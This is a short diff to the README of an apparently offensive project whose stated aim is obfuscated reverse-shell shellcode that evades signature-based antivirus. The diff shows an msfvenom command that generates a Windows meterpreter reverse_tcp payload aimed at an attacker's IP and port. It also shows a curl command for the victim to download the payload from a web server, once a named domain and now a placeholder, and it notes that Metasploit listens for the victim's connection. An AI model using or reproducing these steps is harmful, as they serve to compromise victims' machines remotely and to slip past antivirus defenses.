@@ -22,9 +22,9 @@ Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus
             
       $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0"
       
-  To download the shellcode as a victim:
+  To download the shellcode as a victim via web server:
     
-      $curl bigbadcyborg.com/download.php > payload-22.txt
+      $curl {your http web server}/download.php > payload-22.txt
       
   Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
       To download the metasploit installer:
